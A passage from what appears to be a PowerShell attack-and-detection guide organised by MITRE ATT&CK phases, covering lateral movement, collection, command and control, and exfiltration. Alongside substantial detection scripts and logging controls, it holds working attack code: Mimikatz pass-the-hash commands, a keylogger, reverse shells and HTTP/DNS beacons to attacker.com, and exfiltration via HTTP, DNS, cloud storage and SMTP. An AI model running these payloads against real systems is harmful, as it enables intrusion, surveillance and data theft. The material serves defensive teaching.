$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target.domain.com"))
$com.item().Document.Application.ShellExecute("powershell.exe","-c Get-Process","C:\Windows\System32",$null,0)

# ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","target.domain.com"))
$com.Document.Application.ShellExecute("powershell.exe")
```
{% endcode %}

#### Pass the Hash/Ticket

{% code overflow="wrap" %}
```powershell
# Using Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:<hash> /run:powershell.exe"'

# Pass the ticket
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
klist  # Verify ticket loaded

# Using Rubeus
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe asktgt /user:admin /rc4:<hash> /ptt
```
{% endcode %}

### Detection Strategies

#### Log Analysis

```powershell
# Remote PowerShell connections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinRM/Operational';Id=6} |
    Select-Object TimeCreated, Message

# WMI process creation
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} |
    Where-Object { $_.Message -match 'WmiPrvSE' }

# Service creation
Get-WinEvent -FilterHashtable @{LogName='System';Id=7045}

# Logon events (network logon type 3)
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
    Where-Object { $_.Message -match 'Logon Type:\s+3' }
```

#### Detection Script

{% code overflow="wrap" %}
```powershell
# Lateral Movement Detection Script
Write-Host "=== Lateral Movement Detection ===" -ForegroundColor Yellow

# WinRM activity
Write-Host "`n[1] WinRM/PSRemoting Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-WinRM/Operational'} -MaxEvents 50 -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, Id, @{N='Message';E={$_.Message.Substring(0,100)}} | Format-Table -AutoSize

# Remote process creation via WMI
Write-Host "`n[2] WMI Remote Process Creation:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'WmiPrvSE' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Network logons (Type 3)
Write-Host "`n[3] Network Logon Events:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 50 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Logon Type:\s+3' } |
    Select-Object TimeCreated, @{N='User';E={($_.Message -split "Account Name:")[2].Split("`n")[0]}} | Format-Table -AutoSize

# New service creation
Write-Host "`n[4] New Service Creation:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} -MaxEvents 20 -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, @{N='Service';E={$_.Message}} | Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 11: Collection

### Attack Techniques

#### Data Staging

{% code overflow="wrap" %}
```powershell
# Collect files
$files = Get-ChildItem -Path C:\Users -Include *.doc,*.docx,*.xls,*.xlsx,*.pdf,*.txt -Recurse -ErrorAction SilentlyContinue
Copy-Item $files.FullName -Destination C:\temp\staging\

# Compress for exfiltration
Compress-Archive -Path C:\temp\staging\* -DestinationPath C:\temp\data.zip

# Encrypt before exfiltration
$bytes = [IO.File]::ReadAllBytes("C:\temp\data.zip")
$encrypted = [Security.Cryptography.ProtectedData]::Protect($bytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
[IO.File]::WriteAllBytes("C:\temp\data.enc", $encrypted)
```
{% endcode %}

#### Clipboard Capture

```powershell
# Read clipboard
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Clipboard]::GetText()

# Monitor clipboard
while($true) {
    $clip = [System.Windows.Forms.Clipboard]::GetText()
    if ($clip -ne $lastClip) {
        $clip | Out-File -FilePath C:\temp\clipboard.txt -Append
        $lastClip = $clip
    }
    Start-Sleep -Seconds 1
}
```

#### Keylogging

```powershell
# Simple keylogger using GetAsyncKeyState
$signature = @"
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
"@
$API = Add-Type -MemberDefinition $signature -Name "Keyboard" -Namespace "Win32" -PassThru

while ($true) {
    Start-Sleep -Milliseconds 40
    for ($i = 8; $i -le 254; $i++) {
        $state = $API::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [System.Windows.Forms.Keys]$i
            $key | Out-File -FilePath C:\temp\keys.txt -Append
        }
    }
}
```

#### Screenshot Capture

```powershell
# Take screenshot
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("C:\temp\screenshot.png")
```

### Detection Strategies

{% code overflow="wrap" %}
```powershell
# Collection Detection Script
Write-Host "=== Collection Activity Detection ===" -ForegroundColor Yellow

# Archive creation
Write-Host "`n[1] Archive Creation Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Compress-Archive|System\.IO\.Compression|\.zip' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Clipboard access
Write-Host "`n[2] Clipboard Access:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Clipboard|GetText|SetText' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Keylogger indicators
Write-Host "`n[3] Keylogger Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'GetAsyncKeyState|user32.*keyboard' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Screenshot indicators
Write-Host "`n[4] Screenshot Activity:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'CopyFromScreen|System\.Drawing|screenshot' } |
    Select-Object TimeCreated | Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 12: Command & Control

### Attack Techniques

#### PowerShell Reverse Shells

{% code overflow="wrap" %}
```powershell
# Basic reverse shell
$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

# One-liner reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

#### HTTP/HTTPS C2

{% code overflow="wrap" %}
```powershell
# HTTP beacon
while ($true) {
    try {
        $cmd = (New-Object Net.WebClient).DownloadString("http://attacker.com/cmd")
        if ($cmd -ne "") {
            $result = IEX $cmd 2>&1 | Out-String
            (New-Object Net.WebClient).UploadString("http://attacker.com/result", $result)
        }
    } catch {}
    Start-Sleep -Seconds 60
}

# HTTPS with cert bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object Net.WebClient
$wc.DownloadString("https://attacker.com/payload.ps1") | IEX
```
{% endcode %}

#### DNS C2

```powershell
# DNS beacon (simulated - requires DNS infrastructure)
while ($true) {
    $hostname = [System.Net.Dns]::GetHostName()
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
    Resolve-DnsName "$encoded.beacon.attacker.com" -Type TXT -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 300
}
```

#### C2 Frameworks (PowerShell agents)

```powershell
# Empire agent
# PowerShell Empire stager downloads and executes agent

# Covenant Grunt
# Covenant framework PowerShell launcher

# Metasploit PowerShell payload
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f psh

# Cobalt Strike PowerShell beacon
# Generated via Attacks > Web Drive-by > Scripted Web Delivery
```

### Detection Strategies

#### C2 Detection Script

{% code overflow="wrap" %}
```powershell
# C2 Detection Script
Write-Host "=== Command & Control Detection ===" -ForegroundColor Yellow

# Outbound connections from PowerShell
Write-Host "`n[1] PowerShell Network Connections:" -ForegroundColor Cyan
Get-NetTCPConnection | Where-Object {
    $_.OwningProcess -in (Get-Process -Name powershell*,pwsh* -ErrorAction SilentlyContinue).Id -and
    $_.State -eq "Established"
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State

# Beaconing patterns (multiple connections to same destination)
Write-Host "`n[2] Potential Beaconing (Repeated Connections):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Security';Id=5156} -MaxEvents 1000 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'powershell|pwsh' } |
    Group-Object { ($_.Message -split "Destination Address:")[1].Split("`n")[0] } |
    Where-Object { $_.Count -gt 5 } |
    Select-Object Count, Name

# HTTP/HTTPS beacons in script blocks
Write-Host "`n[3] HTTP C2 Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'while.*true.*WebClient|Start-Sleep.*Download|beacon' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Reverse shell indicators
Write-Host "`n[4] Reverse Shell Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'TCPClient|System\.Net\.Sockets|\.GetStream\(\)|reverse.*shell' } |
    Select-Object TimeCreated | Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Phase 13: Exfiltration

### Attack Techniques

#### HTTP/HTTPS Exfiltration

{% code overflow="wrap" %}
```powershell
# POST data
$data = Get-Content C:\sensitive\data.txt -Raw
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$encoded = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri "http://attacker.com/collect" -Method POST -Body $encoded

# File upload
Invoke-RestMethod -Uri "http://attacker.com/upload" -Method POST -InFile C:\temp\data.zip

# Chunks for large files
$file = [IO.File]::ReadAllBytes("C:\temp\large.zip")
$chunkSize = 1MB
for ($i = 0; $i -lt $file.Length; $i += $chunkSize) {
    $chunk = $file[$i..([Math]::Min($i + $chunkSize - 1, $file.Length - 1))]
    $encoded = [Convert]::ToBase64String($chunk)
    Invoke-WebRequest -Uri "http://attacker.com/chunk" -Method POST -Body @{data=$encoded;offset=$i}
}
```
{% endcode %}

#### DNS Exfiltration

{% code overflow="wrap" %}
```powershell
# Encode data in DNS queries
$data = Get-Content C:\sensitive\data.txt -Raw
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$encoded = [System.Convert]::ToBase64String($bytes) -replace '\+','-' -replace '/','_' -replace '=',''

# Split into DNS-safe chunks (63 chars max per label)
$chunks = $encoded -split '(.{60})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName "$chunk.exfil.attacker.com" -DnsOnly -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 100
}
```
{% endcode %}

#### Cloud Exfiltration

{% code overflow="wrap" %}
```powershell
# To cloud storage (requires credentials/tokens)
# Azure Blob
$context = New-AzStorageContext -StorageAccountName "account" -StorageAccountKey "key"
Set-AzStorageBlobContent -File C:\temp\data.zip -Container "exfil" -Blob "data.zip" -Context $context

# AWS S3
Write-S3Object -BucketName "exfil-bucket" -File C:\temp\data.zip -Key "data.zip"

# OneDrive/SharePoint
# Using Graph API
```
{% endcode %}

#### Email Exfiltration

```powershell
# Send via SMTP
$smtp = New-Object System.Net.Mail.SmtpClient("smtp.attacker.com", 587)
$smtp.EnableSSL = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential("user", "pass")

$message = New-Object System.Net.Mail.MailMessage
$message.From = "attacker@attacker.com"
$message.To.Add("collect@attacker.com")
$message.Subject = "Data"
$attachment = New-Object System.Net.Mail.Attachment("C:\temp\data.zip")
$message.Attachments.Add($attachment)
$smtp.Send($message)
```

### Detection Strategies

#### Exfiltration Detection Script

{% code overflow="wrap" %}
```powershell
# Exfiltration Detection Script
Write-Host "=== Data Exfiltration Detection ===" -ForegroundColor Yellow

# Large outbound transfers
Write-Host "`n[1] Large HTTP Transfers:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'UploadFile|UploadData|Invoke-WebRequest.*POST|Invoke-RestMethod.*POST' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# DNS exfiltration indicators
Write-Host "`n[2] DNS Exfiltration Indicators:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Resolve-DnsName.*Base64|dns.*exfil' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Cloud storage access
Write-Host "`n[3] Cloud Storage Access:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'AzStorage|S3Object|OneDrive|SharePoint|blob\.core' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Email exfiltration
Write-Host "`n[4] Email Exfiltration:" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'SmtpClient|Send-MailMessage|\.Send\(' } |
    Select-Object TimeCreated | Format-Table -AutoSize

# Compression before exfil
Write-Host "`n[5] Data Staging (Compression):" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} -MaxEvents 200 -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'Compress-Archive|\.zip|System\.IO\.Compression' } |
    Select-Object TimeCreated | Format-Table -AutoSize

Write-Host "`n=== Detection Complete ===" -ForegroundColor Yellow
```
{% endcode %}

***

## Comprehensive Detection Script

{% code overflow="wrap" %}
```powershell
<#
.SYNOPSIS
    Comprehensive PowerShell Attack Detection Script

.DESCRIPTION
    Scans for indicators of PowerShell-based attacks across all MITRE ATT&CK tactics.

.EXAMPLE
    .\Detect-PowerShellAttacks.ps1
#>

param(
    [int]$MaxEvents = 500,
    [int]$HoursBack = 24
)

$startTime = (Get-Date).AddHours(-$HoursBack)
$report = @()

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "PowerShell Attack Detection Report" -ForegroundColor Yellow
Write-Host "Time Range: Last $HoursBack hours" -ForegroundColor Yellow
Write-Host "Generated: $(Get-Date)" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

# Function to safely query events
function Get-SafeWinEvent {
    param($FilterHashtable, $MaxEvents)
    try {
        Get-WinEvent -FilterHashtable $FilterHashtable -MaxEvents $MaxEvents -ErrorAction Stop
    } catch {
        @()
    }
}

# 1. RECONNAISSANCE
Write-Host "`n[1] RECONNAISSANCE" -ForegroundColor Cyan
$reconPatterns = 'Get-AD|DirectorySearcher|LDAP|Test-Connection|TcpClient|Get-NetNeighbor|arp|nslookup'
$recon = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $reconPatterns }
Write-Host "  Reconnaissance events found: $($recon.Count)"

# 2. INITIAL ACCESS
Write-Host "`n[2] INITIAL ACCESS" -ForegroundColor Cyan
$accessPatterns = 'DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|WebClient|BitsTransfer|Net\.Http|iwr |irm '
$access = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $accessPatterns }
Write-Host "  Download cradle events found: $($access.Count)"

# 3. EXECUTION
Write-Host "`n[3] EXECUTION" -ForegroundColor Cyan
$execPatterns = 'Invoke-Expression|IEX |iex\(|EncodedCommand|FromBase64String|Add-Type.*DllImport'
$execution = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $execPatterns }
Write-Host "  Suspicious execution events: $($execution.Count)"

# 4. PERSISTENCE
Write-Host "`n[4] PERSISTENCE" -ForegroundColor Cyan
$persPatterns = 'ScheduledTask|Register-|New-Service|HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run|WMI.*subscription'
$persistence = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $persPatterns }
Write-Host "  Persistence events found: $($persistence.Count)"

# 5. PRIVILEGE ESCALATION
Write-Host "`n[5] PRIVILEGE ESCALATION" -ForegroundColor Cyan
$privPatterns = 'ms-settings|fodhelper|eventvwr|bypassuac|AlwaysInstallElevated'
$privesc = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $privPatterns }
Write-Host "  Privilege escalation events: $($privesc.Count)"

# 6. DEFENSE EVASION
Write-Host "`n[6] DEFENSE EVASION" -ForegroundColor Cyan
$evasionPatterns = 'AmsiUtils|amsiInitFailed|\[char\]|`|\-Version 2|ScriptBlockLogging.*0'
$evasion = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $evasionPatterns }
Write-Host "  Defense evasion events: $($evasion.Count)"

# 7. CREDENTIAL ACCESS
Write-Host "`n[7] CREDENTIAL ACCESS" -ForegroundColor Cyan
$credPatterns = 'mimikatz|sekurlsa|lsadump|kerberos::|SAM|SYSTEM|SECURITY|PasswordVault|Get-Credential|cmdkey'
$creds = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $credPatterns }
Write-Host "  Credential access events: $($creds.Count)"

# 8. DISCOVERY
Write-Host "`n[8] DISCOVERY" -ForegroundColor Cyan
$discPatterns = 'systeminfo|Get-ComputerInfo|Get-LocalUser|Get-LocalGroup|Get-Process|Get-Service|whoami|Get-NetIP|Get-NetTCP'
$discovery = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $discPatterns }
Write-Host "  Discovery events found: $($discovery.Count)"

# 9. LATERAL MOVEMENT
Write-Host "`n[9] LATERAL MOVEMENT" -ForegroundColor Cyan
$lateralPatterns = 'Enter-PSSession|Invoke-Command.*ComputerName|New-PSSession|Invoke-WmiMethod|New-CimSession'
$lateral = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $lateralPatterns }
Write-Host "  Lateral movement events: $($lateral.Count)"

# 10. COLLECTION
Write-Host "`n[10] COLLECTION" -ForegroundColor Cyan
$collectPatterns = 'Compress-Archive|Clipboard|GetAsyncKeyState|CopyFromScreen|screenshot'
$collection = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $collectPatterns }
Write-Host "  Collection events found: $($collection.Count)"

# 11. COMMAND & CONTROL
Write-Host "`n[11] COMMAND & CONTROL" -ForegroundColor Cyan
$c2Patterns = 'TCPClient|System\.Net\.Sockets|while.*true.*Sleep|beacon|reverse.*shell'
$c2 = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $c2Patterns }
Write-Host "  C2 indicator events: $($c2.Count)"

# 12. EXFILTRATION
Write-Host "`n[12] EXFILTRATION" -ForegroundColor Cyan
$exfilPatterns = 'UploadFile|UploadData|UploadString|Send-MailMessage|SmtpClient|AzStorage|S3Object'
$exfil = Get-SafeWinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=$startTime} -MaxEvents $MaxEvents |
    Where-Object { $_.Message -match $exfilPatterns }
Write-Host "  Exfiltration events: $($exfil.Count)"

# Summary
Write-Host "`n========================================" -ForegroundColor Yellow
Write-Host "SUMMARY" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
$total = $recon.Count + $access.Count + $execution.Count + $persistence.Count + $privesc.Count + $evasion.Count + $creds.Count + $discovery.Count + $lateral.Count + $collection.Count + $c2.Count + $exfil.Count
Write-Host "Total suspicious events: $total"

if ($total -gt 0) {
    Write-Host "`nTop Categories:" -ForegroundColor Red
    $categories = @{
        "Reconnaissance"=$recon.Count
        "Initial Access"=$access.Count
        "Execution"=$execution.Count
        "Persistence"=$persistence.Count
        "Privilege Escalation"=$privesc.Count
        "Defense Evasion"=$evasion.Count
        "Credential Access"=$creds.Count
        "Discovery"=$discovery.Count
        "Lateral Movement"=$lateral.Count
        "Collection"=$collection.Count
        "C2"=$c2.Count
        "Exfiltration"=$exfil.Count
    }
    $categories.GetEnumerator() | Sort-Object Value -Descending | Where-Object { $_.Value -gt 0 } | ForEach-Object {
        Write-Host "  $($_.Key): $($_.Value)" -ForegroundColor $(if($_.Value -gt 10){'Red'}else{'Yellow'})
    }
}

Write-Host "`n========================================" -ForegroundColor Yellow
Write-Host "Detection Complete" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
```
{% endcode %}

***

## Quick Reference Card

### Common Attack Patterns

<table><thead><tr><th width="182">Technique</th><th>Command Pattern</th><th>Detection</th></tr></thead><tbody><tr><td>Download cradle</td><td><code>IEX (New-Object Net.WebClient).DownloadString(...)</code></td><td>Event 4104 + network indicators</td></tr><tr><td>Encoded command</td><td><code>powershell -EncodedCommand &#x3C;base64></code></td><td>Event 4104 + 4688</td></tr><tr><td>Persistence</td><td><code>Register-ScheduledTask</code>, Run keys</td><td>Task Scheduler logs, registry audit</td></tr><tr><td>Credential dump</td><td><code>Invoke-Mimikatz</code>, LSASS access</td><td>Event 4663, 4688</td></tr><tr><td>Lateral movement</td><td><code>Invoke-Command -ComputerName</code></td><td>WinRM logs, network logon events</td></tr><tr><td>C2 beacon</td><td><code>while($true){...Sleep...}</code></td><td>Network connections, Event 4104</td></tr></tbody></table>

### Critical Event IDs

| Event ID | Log                    | Description          |
| -------- | ---------------------- | -------------------- |
| 4104     | PowerShell/Operational | Script block logging |
| 4103     | PowerShell/Operational | Module logging       |
| 400/403  | Windows PowerShell     | Engine start/stop    |
| 4688     | Security               | Process creation     |
| 4624     | Security               | Logon events         |
| 4663     | Security               | Object access        |
| 7045     | System                 | Service creation     |

### Defensive Controls

{% code overflow="wrap" %}
```powershell
# Enable all PowerShell logging
# Via GPO: Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell

# Script Block Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Transcription
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "OutputDirectory" -Value "C:\PSLogs"

# Module Logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1

# Constrained Language Mode (via WDAC/AppLocker)
# Process command line logging
auditpol /set /subcategory:"Process Creation" /success:enable
```
{% endcode %}

***

### MITRE ATT\&CK Mapping

| Tactic               | Technique | PowerShell Usage                     |
| -------------------- | --------- | ------------------------------------ |
| Reconnaissance       | T1595     | Port scanning, AD queries            |
| Initial Access       | T1566     | Phishing payloads, download cradles  |
| Execution            | T1059.001 | PowerShell scripts, fileless malware |
| Persistence          | T1053.005 | Scheduled tasks                      |
| Persistence          | T1547.001 | Registry run keys                    |
| Privilege Escalation | T1548.002 | UAC bypass                           |
| Defense Evasion      | T1027     | Obfuscation                          |
| Defense Evasion      | T1562.001 | Disable logging                      |
| Credential Access    | T1003     | Mimikatz, LSASS dump                 |
| Discovery            | T1087     | User/group enumeration               |
| Lateral Movement     | T1021.006 | WinRM/PSRemoting                     |
| Collection           | T1560     | Archive/compress data                |
| C2                   | T1071.001 | HTTP/HTTPS channels                  |
| Exfiltration         | T1041     | Exfil over C2 channel                |
